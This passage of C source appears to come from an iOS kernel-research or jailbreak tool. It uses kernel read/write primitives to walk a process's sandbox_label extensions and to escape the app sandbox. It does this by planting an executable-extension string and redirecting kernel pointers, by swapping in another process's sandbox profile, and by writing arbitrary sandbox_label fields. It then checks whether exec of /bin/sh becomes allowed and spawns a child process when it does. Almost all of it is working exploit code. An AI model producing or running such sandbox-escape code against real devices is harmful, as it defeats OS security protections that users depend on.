        buf_append("Zone bounds not calibrated — auto-calibrating...\n");
        bool cal_ok = calibrate_zone_bounds();
        if (!cal_ok) {
            buf_append("WARNING: zone calibration failed. Chain walking will be conservative.\n\n");
        } else {
            buf_append("Zone meta: 0x%llx - 0x%llx (detected=%s)\n",
                       g_zone_meta_min, g_zone_meta_max,
                       g_zone_meta_detected ? "YES" : "no");
            buf_append("Zone map:  0x%llx - 0x%llx\n\n",
                       g_zone_map_min, g_zone_map_max);
        }
    }

    uint64_t self_proc = proc_self();
    if (!self_proc) {
        buf_append("ERROR: proc_self() returned NULL\n");
        return buf_finish();
    }
    uint64_t label = proc_get_cred_label(self_proc);
    if (!label) {
        buf_append("ERROR: proc_get_cred_label returned NULL\n");
        return buf_finish();
    }
    uint64_t sbx = label_get_sandbox(label);
    if (!sbx) {
        buf_append("ERROR: label_get_sandbox returned NULL\n");
        return buf_finish();
    }

    buf_append("sandbox_label @ 0x%llx\n", sbx);

    // Read the sandbox_label
    struct sandbox_label sbx_lbl = {0};
    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
    buf_append("  platform_profile: 0x%llx\n", sbx_lbl.platform_profile);
    buf_append("  unk1:             0x%llx\n", sbx_lbl.unk1);
    buf_append("  extension_set:    0x%llx\n", (uint64_t)sbx_lbl.extension_set);
    buf_append("  unk3:             0x%llx\n", sbx_lbl.unk3);

    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
    if (!ext_set_kptr) {
        buf_append("\nERROR: extension_set is NULL\n");
        return buf_finish();
    }

    // Read the extension_set
    struct extension_set ext_set = {0};
    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));

    buf_append("\nextension_set @ 0x%llx\n", ext_set_kptr);

    // Raw dump of extension_set (16 bucket pointers = 128 bytes)
    uint8_t ext_set_raw[128];
    kreadbuf(ext_set_kptr, ext_set_raw, 128);
    buf_append("  raw extension_set (128 bytes):\n");
    for (int row = 0; row < 128; row += 16) {
        buf_append("    +0x%02x: ", row);
        for (int c = 0; c < 16; c++) {
            buf_append("%02x ", ext_set_raw[row + c]);
        }
        buf_append("\n");
    }

    int total_extensions = 0;
    for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
        uint64_t bucket = (uint64_t)ext_set.type_buckets[i];
        if (!bucket) {
            buf_append("\n  bucket[%d]: NULL (empty)\n", i);
            continue;
        }

        buf_append("\n  bucket[%d]: 0x%llx\n", i, bucket);

        // Validate bucket pointer is in heap before following
        if (!kptr_heap_ok(bucket)) {
            buf_append("    SKIP: 0x%llx outside heap (zone_meta=%s, zone_map=%s)\n",
                       bucket, is_zone_meta(bucket) ? "YES" : "no",
                       (g_zone_map_detected && (bucket < g_zone_map_min || bucket > g_zone_map_max)) ? "OUT" : "ok");
            continue;
        }

        // Walk the extension_class_node chain in this bucket
        uint64_t class_node_ptr = bucket;
        int chain_idx = 0;
        while (class_node_ptr && kptr_heap_ok(class_node_ptr) && chain_idx < 10) {
            struct extension_class_node cn = {0};
            kreadbuf(class_node_ptr, &cn, sizeof(cn));

            // Raw hex dump of class_node (0x20 bytes)
            uint8_t cn_raw[0x20];
            kreadbuf(class_node_ptr, cn_raw, 0x20);
            buf_append("    class_node[%d] @ 0x%llx  raw:\n      ", chain_idx, class_node_ptr);
            for (int c = 0; c < 0x20; c++) {
                buf_append("%02x ", cn_raw[c]);
                if (c == 7 || c == 15 || c == 23) buf_append(" ");
            }
            buf_append("\n");

            // Read class name (confirmed at +0x10 in the struct)
            char class_name[256] = {0};
            if (kaddr_ok((uint64_t)cn.class_name)) {
                kreadbuf((uint64_t)cn.class_name, class_name, 255);
            }
            buf_append("      class_name(+0x10): \"%s\" (ptr=0x%llx)\n", class_name, (uint64_t)cn.class_name);
            buf_append("      next(+0x00):  0x%llx\n", (uint64_t)cn.next);
            buf_append("      ext_head(+0x08): 0x%llx\n", (uint64_t)cn.ext_list_head);
            buf_append("      count(+0x18):    %llu\n", cn.count);

            // Walk the extension linked list
            uint64_t ext_ptr = (uint64_t)cn.ext_list_head;
            int ext_idx = 0;
            while (ext_ptr && kptr_heap_ok(ext_ptr) && ext_idx < 20) {
                // Raw hex dump of extension (0x60 bytes)
                uint8_t ext_raw[EXT_RAW_SIZE];
                kreadbuf(ext_ptr, ext_raw, EXT_RAW_SIZE);

                // Read fields via confirmed raw offsets
                uint64_t data_ptr = *(uint64_t *)(ext_raw + EXT_OFF_DATA);
                uint64_t data_len = *(uint64_t *)(ext_raw + EXT_OFF_DATALEN);
                uint64_t ext_next = *(uint64_t *)(ext_raw + 0x00);  // next extension in list

                char data_path[256] = {0};
                if (kaddr_ok(data_ptr)) {
                    kreadbuf(data_ptr, data_path, 255);
                }

                buf_append("        ext[%d] @ 0x%llx  raw:\n", ext_idx, ext_ptr);
                for (int row = 0; row < EXT_RAW_SIZE; row += 16) {
                    buf_append("          +0x%02x: ", row);
                    for (int c = 0; c < 16 && (row + c) < EXT_RAW_SIZE; c++) {
                        buf_append("%02x ", ext_raw[row + c]);
                    }
                    buf_append("\n");
                }
                buf_append("          data_ptr(+0x40)=\"%s\" ptr=0x%llx len=%llu\n",
                           data_path, data_ptr, data_len);
                // Dump a few more potentially useful raw fields
                uint64_t raw_0x50 = *(uint64_t *)(ext_raw + 0x50);
                uint64_t raw_0x58 = *(uint64_t *)(ext_raw + 0x58);
                buf_append("          +0x50=0x%llx  +0x58=0x%llx  next=0x%llx\n",
                           raw_0x50, raw_0x58, ext_next);

                total_extensions++;
                // Follow next pointer — validate it's in heap before reading
                if (ext_next && !kptr_heap_ok(ext_next)) {
                    buf_append("          ⚠️ STOPPED: next ptr 0x%llx fails heap check (zone_meta=%s, zone_map=%s, align=%s)\n",
                               ext_next, is_zone_meta(ext_next) ? "YES" : "no",
                               (g_zone_map_detected && (ext_next < g_zone_map_min || ext_next > g_zone_map_max)) ? "OUT" : "ok",
                               (ext_next & 0x7) ? "BAD" : "ok");
                    break;
                }
                ext_ptr = ext_next;
                ext_idx++;
            }

            // Validate class_node next pointer is in heap before following
            uint64_t cn_next = (uint64_t)cn.next;
            if (cn_next && !kptr_heap_ok(cn_next)) {
                buf_append("      ⚠️ STOPPED: class_node next 0x%llx fails heap check (zone_meta=%s, zone_map=%s)\n",
                           cn_next, is_zone_meta(cn_next) ? "YES" : "no",
                           (g_zone_map_detected && (cn_next < g_zone_map_min || cn_next > g_zone_map_max)) ? "OUT" : "ok");
                break;
            }
            class_node_ptr = cn_next;
            chain_idx++;
        }
    }

    buf_append("\n=== TOTAL: %d extensions across %d buckets ===\n",
               total_extensions, SANDBOX_EXT_NUM_BUCKETS);
    return buf_finish();
}

char *kresearch_patch_exec(void) {
    buf_init();
    bc_init();
    buf_append("=== PATCH EXEC v7: ZONE-VALIDATED POINTER REDIRECT ===\n\n");
    buf_append("v5 panicked: class_name strings are in kernelcache static\n");
    buf_append("region (SPTM read-only). Cannot overwrite constant strings.\n");
    buf_append("v6 panicked: data_ptr was outside zone map (unmapped memory).\n");
    buf_append("v7: requires detect_zones first. Validates ALL write targets\n");
    buf_append("are within zone map bounds. Plants string in writable data\n");
    buf_append("buffer, redirects class_name POINTER in class_node struct.\n\n");
    bc("patch_exec v7 starting\n");

    // Auto-calibrate zone map if not done yet
    if (!g_zone_map_detected) {
        buf_append("Zone map not calibrated — auto-calibrating...\n");
        bc("auto-calibrating zone bounds\n");
        bool cal_ok = calibrate_zone_bounds();
        if (!cal_ok || !g_zone_map_detected) {
            buf_append("ABORT: zone calibration failed — cannot determine safe write range.\n");
            bc("ABORT: calibration failed\n");
            bc_close();
            return buf_finish();
        }
        buf_append("Zone bounds calibrated successfully.\n");
    }
    buf_append("Zone map: 0x%llx - 0x%llx (calibrated)\n", g_zone_map_min, g_zone_map_max);
    buf_append("Zone meta: 0x%llx - 0x%llx (excluded)\n\n", g_zone_meta_min, g_zone_meta_max);

    uint64_t self_proc = proc_self();
    if (!self_proc) {
        buf_append("ABORT: proc_self() returned NULL\n");
        bc("ABORT: proc_self NULL\n");
        bc_close();
        return buf_finish();
    }
    uint64_t label = proc_get_cred_label(self_proc);
    if (!label) {
        buf_append("ABORT: proc_get_cred_label returned NULL\n");
        bc("ABORT: label NULL\n");
        bc_close();
        return buf_finish();
    }
    uint64_t sbx = label_get_sandbox(label);
    if (!sbx) {
        buf_append("ABORT: label_get_sandbox returned NULL\n");
        bc("ABORT: sandbox NULL\n");
        bc_close();
        return buf_finish();
    }
    bc("sandbox_label @ 0x%llx\n", sbx);

    struct sandbox_label sbx_lbl = {0};
    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
    if (!ext_set_kptr) {
        buf_append("ABORT: extension_set is NULL\n");
        bc("ABORT: ext_set NULL\n");
        bc_close();
        return buf_finish();
    }
    buf_append("extension_set @ 0x%llx\n", ext_set_kptr);
    bc("ext_set @ 0x%llx\n", ext_set_kptr);

    // Read the extension_set (16 bucket pointers)
    uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
    kreadbuf(ext_set_kptr, buckets, sizeof(buckets));

    // ── Phase 1: Scan all 16 buckets ──
    buf_append("\n--- Extension Bucket Scan ---\n");
    bc("scanning %d buckets\n", SANDBOX_EXT_NUM_BUCKETS);

    int rw_count = 0;
    int total_classes = 0;
    int total_exts = 0;

    // We need two things:
    // 1. A class_node in a writable region (zone heap) to redirect its pointer
    // 2. A writable data buffer to plant our target string into
    uint64_t candidate_cn_addr      = 0;  // class_node address (to modify its +0x10 pointer)
    uint64_t candidate_cn_name_ptr  = 0;  // original class_name pointer (for restore)
    int      candidate_bucket       = -1;
    uint64_t stash_addr             = 0;  // writable data buffer to plant our string
    uint64_t stash_data_len         = 0;
    char     stash_orig[64]         = {0}; // original bytes at stash location

    const char *target_name = "com.apple.sandbox.executable";
    size_t target_len = strlen(target_name) + 1; // 30 bytes

    for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
        if (!buckets[i]) {
            buf_append("  bucket[%d]: NULL\n", i);
            continue;
        }
        if (!kptr_heap_ok(buckets[i])) {
            buf_append("  bucket[%d]: 0x%llx SKIP (zone_meta=%s align=%s)\n",
                       i, buckets[i], is_zone_meta(buckets[i]) ? "YES" : "no",
                       (buckets[i] & 0x1F) ? "BAD" : "ok");
            continue;
        }

        uint8_t cn_raw[0x20];
        kreadbuf(buckets[i], cn_raw, 0x20);

        uint64_t cn_classname = *(uint64_t *)(cn_raw + CN_OFF_CLASSNAME);
        uint64_t cn_ext       = *(uint64_t *)(cn_raw + CN_OFF_EXT);
        uint64_t cn_count     = *(uint64_t *)(cn_raw + CN_OFF_COUNT);

        char name[256] = {0};
        if (kaddr_ok(cn_classname)) {
            kreadbuf(cn_classname, name, 255);
        }

        bool cn_writable = kaddr_writable(buckets[i]);
        bool name_static = is_kernel_static(cn_classname);
        buf_append("  bucket[%d]: \"%s\" cn=0x%llx%s name=0x%llx%s count=%llu\n",
                   i, name, buckets[i],
                   cn_writable ? " [heap]" : " [RO!]",
                   cn_classname,
                   name_static ? " [static]" : " [heap]",
                   (unsigned long long)cn_count);
        total_classes++;

        if (strstr(name, "read-write")) {
            rw_count++;
            // Pick first writable class_node as our target
            if (cn_writable && !candidate_cn_addr) {
                candidate_cn_addr     = buckets[i];
                candidate_cn_name_ptr = cn_classname;
                candidate_bucket      = i;
                buf_append("    -> CANDIDATE class_node (writable heap)\n");
            }
        }

        // Walk extensions to find a writable data buffer for our string stash
        uint64_t ext = cn_ext;
        int ext_count = 0;
        while (ext && kptr_heap_ok_aligned(ext, 0x20) && ext_count < 20) {
            uint8_t eraw[EXT_RAW_SIZE];
            kreadbuf(ext, eraw, EXT_RAW_SIZE);

            uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
            uint64_t data_len = *(uint64_t *)(eraw + EXT_OFF_DATALEN);

            // We want a data buffer big enough for our string AND that's writable
            if (!stash_addr && data_ptr && kaddr_writable(data_ptr) && data_len >= target_len + 64) {
                // Stash our string at the END of the buffer (past the path),
                // aligned to 8 bytes, to minimize corruption risk
                uint64_t stash_off = (data_len - target_len) & ~7ULL;
                if (stash_off >= 64) { // leave at least 64 bytes for the real path
                    stash_addr = data_ptr + stash_off;
                    stash_data_len = data_len;
                    // Save original bytes for restore
                    kreadbuf(stash_addr, stash_orig, sizeof(stash_orig) - 1);
                    buf_append("    ext[%d]: STASH at 0x%llx (buf 0x%llx len %llu, off %llu)\n",
                               ext_count, stash_addr, data_ptr,
                               (unsigned long long)data_len, (unsigned long long)stash_off);
                }
            }

            uint64_t next = *(uint64_t *)(eraw + 0x00);
            if (next && !kptr_heap_ok_aligned(next, 0x20)) break;
            ext = next;
            ext_count++;
            total_exts++;
        }
    }

    buf_append("\nSummary: %d classes, %d exts, %d rw nodes\n",
               total_classes, total_exts, rw_count);
    buf_append("Candidate CN: 0x%llx (bucket %d)\n", candidate_cn_addr, candidate_bucket);
    buf_append("Stash buffer: 0x%llx\n", stash_addr);
    bc("cn=0x%llx stash=0x%llx\n", candidate_cn_addr, stash_addr);

    // ── Phase 2: Check BEFORE sandbox state ──
    buf_append("\n--- Sandbox Checks (BEFORE) ---\n");
    pid_t pid = getpid();

    int exec_sh_before = sandbox_check(pid, "process-exec",
                                       SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
    int fork_before    = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);

    buf_append("process-exec /bin/sh:  %d (%s)\n", exec_sh_before,
               exec_sh_before == 0 ? "ALLOWED" : "DENIED");
    buf_append("process-fork:          %d (%s)\n", fork_before,
               fork_before == 0 ? "ALLOWED" : "DENIED");
    bc("BEFORE: exec=%d fork=%d\n", exec_sh_before, fork_before);

    // ── Phase 3: WRITE — plant string + redirect pointer ──
    if (!candidate_cn_addr) {
        buf_append("\n--- WRITE SKIPPED: no writable class_node found ---\n");
        bc("no writable cn, skip\n");
    } else if (!stash_addr) {
        buf_append("\n--- WRITE SKIPPED: no writable data buffer for string stash ---\n");
        bc("no stash buffer, skip\n");
    } else {
        buf_append("\n--- WRITE Phase ---\n");

        // Step 1: Plant target string in the data buffer stash
        buf_append("Step 1: Writing \"%s\" to stash @ 0x%llx\n", target_name, stash_addr);
        bc("planting string @ 0x%llx\n", stash_addr);
        kwritebuf(stash_addr, (void *)target_name, (uint32_t)target_len);

        // Verify the string was planted
        char plant_verify[64] = {0};
        kreadbuf(stash_addr, plant_verify, sizeof(plant_verify) - 1);
        bool plant_ok = (strcmp(plant_verify, target_name) == 0);
        buf_append("  Verify: \"%s\" %s\n", plant_verify, plant_ok ? "OK" : "FAILED");
        bc("plant verify: %s\n", plant_ok ? "OK" : "FAIL");

        if (!plant_ok) {
            buf_append("ABORT: string plant failed — data buffer may be PPL protected\n");
            bc("ABORT: plant failed\n");
        } else {
            // Step 2: Redirect class_name pointer from static → our stash
            uint64_t cn_name_field = candidate_cn_addr + CN_OFF_CLASSNAME;
            buf_append("Step 2: Redirecting class_name ptr @ 0x%llx\n", cn_name_field);
            buf_append("  Old ptr: 0x%llx (kernel static)\n", candidate_cn_name_ptr);
            buf_append("  New ptr: 0x%llx (zone heap stash)\n", stash_addr);
            bc("redirect 0x%llx: 0x%llx -> 0x%llx\n",
               cn_name_field, candidate_cn_name_ptr, stash_addr);

            kwrite64(cn_name_field, stash_addr);

            // Verify the pointer was redirected
            uint64_t ptr_verify = kread64(cn_name_field);
            bool ptr_ok = (ptr_verify == stash_addr);
            buf_append("  Verify ptr: 0x%llx %s\n", ptr_verify, ptr_ok ? "OK" : "FAILED");

            // Read through the new pointer to make sure it resolves
            char resolve[64] = {0};
            if (kaddr_ok(ptr_verify)) {
                kreadbuf(ptr_verify, resolve, sizeof(resolve) - 1);
            }
            buf_append("  Resolves to: \"%s\"\n", resolve);
            bc("ptr verify: %s resolves=\"%s\"\n", ptr_ok ? "OK" : "FAIL", resolve);

            if (!ptr_ok) {
                buf_append("ABORT: pointer redirect failed — class_node may be PPL protected\n");
                bc("ABORT: ptr redirect failed\n");
            } else {
                // ── Phase 4: Check AFTER sandbox state ──
                buf_append("\n--- Sandbox Checks (AFTER pointer redirect) ---\n");
                int exec_sh_after = sandbox_check(pid, "process-exec",
                                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
                int exec_df_after = sandbox_check(pid, "process-exec",
                                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/df");
                int fork_after    = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);

                buf_append("process-exec /bin/sh:  %d (%s)\n", exec_sh_after,
                           exec_sh_after == 0 ? "ALLOWED" : "DENIED");
                buf_append("process-exec /bin/df:  %d (%s)\n", exec_df_after,
                           exec_df_after == 0 ? "ALLOWED" : "DENIED");
                buf_append("process-fork:          %d (%s)\n", fork_after,
                           fork_after == 0 ? "ALLOWED" : "DENIED");
                bc("AFTER: exec_sh=%d exec_df=%d fork=%d\n",
                   exec_sh_after, exec_df_after, fork_after);

                bool changed = (exec_sh_after != exec_sh_before) || (fork_after != fork_before);
                if (changed) {
                    buf_append("\n*** SANDBOX STATE CHANGED! Leaving redirect in place. ***\n");
                    bc("SANDBOX CHANGED! keeping\n");
                } else {
                    buf_append("\nNo sandbox change.\n");

                    // Restore: pointer back to original, then restore stash bytes
                    buf_append("Restoring pointer to 0x%llx\n", candidate_cn_name_ptr);
                    bc("restoring ptr and stash\n");
                    kwrite64(cn_name_field, candidate_cn_name_ptr);

                    // Verify pointer restored
                    uint64_t restore_ptr = kread64(cn_name_field);
                    buf_append("  Ptr restored: 0x%llx %s\n", restore_ptr,
                               restore_ptr == candidate_cn_name_ptr ? "OK" : "FAILED");

                    // Restore stash bytes
                    kwritebuf(stash_addr, stash_orig, (uint32_t)target_len);
                    buf_append("  Stash bytes restored\n");
                    bc("restored\n");
                }
            }
        }
    }

    // ── Phase 5: sandbox_label raw dump ──
    buf_append("\n--- sandbox_label raw dump ---\n");
    uint8_t lbl_raw[0x70];
    kreadbuf(sbx, lbl_raw, sizeof(lbl_raw));
    for (int off = 0; off < 0x70; off += 8) {
        uint64_t val = *(uint64_t *)(lbl_raw + off);
        buf_append("  +0x%02x: 0x%016llx", off, val);
        if (off == 0x00) buf_append("  <- profile_ptr");
        if (off == 0x10) buf_append("  <- extension_set");
        if (off == 0x50) buf_append("  <- flags?");
        if (off == 0x58) buf_append("  <- flags2?");
        buf_append("\n");
    }

    buf_append("\n=== PATCH EXEC v7 COMPLETE ===\n");
    bc("patch_exec v7 complete\n");
    bc_close();
    return buf_finish();
}

// ────────────────────────────────────────────────────────────────────
// Profile pointer swap + sandbox label write
// ────────────────────────────────────────────────────────────────────

char *kresearch_try_profile_swap(int target_pid) {
    buf_init();
    bc_init();
    buf_append("=== PROFILE SWAP: Copying profile from PID %d ===\n\n", target_pid);
    bc("profile_swap start target_pid=%d\n", target_pid);

    // Get our sandbox_label
    uint64_t self_proc = proc_self();
    if (!self_proc) {
        buf_append("ABORT: proc_self() returned NULL\n");
        bc_close();
        return buf_finish();
    }
    uint64_t our_label = proc_get_cred_label(self_proc);
    uint64_t our_sbx = label_get_sandbox(our_label);
    if (!our_sbx) {
        buf_append("ABORT: our sandbox_label is NULL\n");
        bc_close();
        return buf_finish();
    }

    // Read our current profile pointer (sandbox_label + 0x00)
    uint64_t our_profile = kread64(our_sbx);
    buf_append("Our sandbox_label @ 0x%llx\n", our_sbx);
    buf_append("Our profile ptr:    0x%llx\n", our_profile);

    // Dump sandbox_label fields for analysis
    buf_append("\nSandbox_label raw dump:\n");
    for (int off = 0; off <= 0x60; off += 8) {
        uint64_t val = kread64(our_sbx + off);
        buf_append("  +0x%02x: 0x%016llx\n", off, val);
    }

    // Get target process's sandbox_label + profile
    uint64_t target_proc = 0;
    if (target_pid > 0) {
        target_proc = proc_find(target_pid);
    }

    uint64_t target_profile = 0;
    uint64_t target_sbx = 0;
    if (target_proc) {
        if (!kptr_ok(target_proc)) {
            buf_append("ABORT: target proc 0x%llx fails kptr_ok (zone_meta=%s)\n",
                       target_proc, is_zone_meta(target_proc) ? "YES" : "no");
            bc_close();
            return buf_finish();
        }
        uint64_t target_label = proc_get_cred_label(target_proc);
        if (!kptr_ok(target_label)) {
            buf_append("ABORT: target label 0x%llx fails kptr_ok\n", target_label);
            bc_close();
            return buf_finish();
        }
        target_sbx = label_get_sandbox(target_label);
        buf_append("\nTarget sandbox_label @ 0x%llx\n", target_sbx);

        if (target_sbx && target_sbx != (uint64_t)-1 && kptr_ok(target_sbx)) {
            target_profile = kread64(target_sbx);
            buf_append("Target profile ptr:   0x%llx\n", target_profile);

            // Dump target's sandbox_label too for comparison
            buf_append("Target sandbox_label dump:\n");
            for (int off = 0; off <= 0x60; off += 8) {
                uint64_t val = kread64(target_sbx + off);
                buf_append("  +0x%02x: 0x%016llx\n", off, val);
            }
        } else {
            buf_append("Target has no sandbox (ptr=0x%llx) — unsandboxed process\n", target_sbx);
        }
    } else {
        buf_append("Could not find PID %d\n", target_pid);
    }

    // Pre-swap sandbox check
    pid_t my_pid = getpid();
    int pre_exec = sandbox_check(my_pid, "process-exec",
                                 SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                 "/bin/sh");
    int pre_fork = sandbox_check(my_pid, "process-fork",
                                 SANDBOX_CHECK_NO_REPORT);
    buf_append("\nPRE-SWAP:\n");
    buf_append("  process-exec(/bin/sh): %d %s\n", pre_exec, pre_exec == 0 ? "ALLOWED" : "DENIED");
    buf_append("  process-fork:          %d %s\n", pre_fork, pre_fork == 0 ? "ALLOWED" : "DENIED");

    // ── Only safe attempt: Swap with target's profile ──
    // (Writing NULL or zeroing flags causes kernel panics — removed)
    if (!target_profile) {
        buf_append("\nNo valid target profile to swap with.\n");
        buf_append("Suggestions:\n");
        buf_append("  - Try PID 34 (SpringBoard) — has a permissive profile\n");
        buf_append("  - Use sandbox_label_write for manual experimentation\n");
        bc_close();
        return buf_finish();
    }

    buf_append("\n--- Swapping profile: 0x%llx → 0x%llx ---\n", our_profile, target_profile);
    bc("BEFORE profile write: 0x%llx → 0x%llx\n", our_profile, target_profile);
    kwrite64(our_sbx, target_profile);
    bc("AFTER profile write\n");
    uint64_t readback = kread64(our_sbx);
    buf_append("  readback: 0x%llx %s\n", readback,
               readback == target_profile ? "OK" : "MISMATCH!");

    bc("BEFORE sandbox_check with new profile\n");
    int post_exec = sandbox_check(my_pid, "process-exec",
                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                  "/bin/sh");
    int post_fork = sandbox_check(my_pid, "process-fork",
                                  SANDBOX_CHECK_NO_REPORT);
    bc("AFTER sandbox_check exec=%d fork=%d\n", post_exec, post_fork);
    buf_append("  process-exec(/bin/sh): %d %s\n", post_exec, post_exec == 0 ? "ALLOWED!" : "DENIED");
    buf_append("  process-fork:          %d %s\n", post_fork, post_fork == 0 ? "ALLOWED!" : "DENIED");

    if (post_exec == 0) {
        buf_append("\n*** EXEC NOW ALLOWED WITH TARGET PROFILE! ***\n");
        bc("EXEC ALLOWED — trying spawn\n");
        pid_t child = 0;
        char *argv[] = {"/bin/df", NULL};
        extern char **environ;
        int ret = posix_spawn(&child, "/bin/df", NULL, NULL, argv, environ);
        buf_append("posix_spawn(/bin/df): %d (%s)\n", ret, strerror(ret));
        if (ret == 0) {
            buf_append("  *** CHILD PID: %d ***\n", child);
            int status = 0;
            waitpid(child, &status, 0);
            buf_append("  exit: %d\n", WEXITSTATUS(status));
        }
        bc_close();
        return buf_finish();
    }

    // Restore original profile
    buf_append("  Restoring original profile...\n");
    bc("BEFORE restore profile\n");
    kwrite64(our_sbx, our_profile);
    bc("AFTER restore profile\n");
    uint64_t restored = kread64(our_sbx);
    buf_append("  restored: 0x%llx %s\n", restored,
               restored == our_profile ? "OK" : "PROBLEM!");

    buf_append("\n=== PROFILE SWAP — exec still denied ===\n");
    buf_append("The sandbox profile controls process-exec independently of extensions.\n");
    buf_append("SPTM/PPL protects the profile bytecode from being swapped.\n");
    buf_append("Try: patch_exec to add executable extension, or sandbox_label_write\n");
    buf_append("for manual field experimentation with specific offsets.\n");
    bc_close();
    return buf_finish();
}

char *kresearch_sandbox_label_write(int offset, uint64_t value) {
    buf_init();
    buf_append("=== SANDBOX LABEL WRITE: offset=0x%x value=0x%llx ===\n\n", offset, value);

    if (offset < 0 || offset > 0x78) {
        buf_append("ABORT: offset 0x%x out of range (0x00-0x78)\n", offset);
        return buf_finish();
    }

    uint64_t self_proc = proc_self();
    if (!self_proc) {
        buf_append("ABORT: proc_self() returned NULL\n");
        return buf_finish();
    }
    uint64_t label_ptr = proc_get_cred_label(self_proc);
    uint64_t sbx = label_get_sandbox(label_ptr);
    if (!sbx) {
        buf_append("ABORT: sandbox_label is NULL\n");
        return buf_finish();
    }

    uint64_t addr = sbx + (uint64_t)offset;
    uint64_t old_val = kread64(addr);
    buf_append("sandbox_label @ 0x%llx\n", sbx);
    buf_append("  target addr:   0x%llx (+0x%x)\n", addr, offset);
    buf_append("  old value:     0x%llx\n", old_val);
    buf_append("  new value:     0x%llx\n", value);

    kwrite64(addr, value);
    uint64_t readback = kread64(addr);
    buf_append("  readback:      0x%llx %s\n", readback,
               readback == value ? "OK" : "MISMATCH!");

    // Test sandbox after write
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                   SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                   "/bin/sh");
    int fork_check = sandbox_check(pid, "process-fork",
                                   SANDBOX_CHECK_NO_REPORT);
    buf_append("\nAfter write:\n");
    buf_append("  process-exec(/bin/sh): %d %s\n", exec_check, exec_check == 0 ? "ALLOWED!" : "DENIED");
    buf_append("  process-fork:          %d %s\n", fork_check, fork_check == 0 ? "ALLOWED!" : "DENIED");

    buf_append("\nOriginal value was 0x%llx — use sandbox_label_write(0x%x, 0x%llx) to restore.\n",
               old_val, offset, old_val);
    return buf_finish();
}
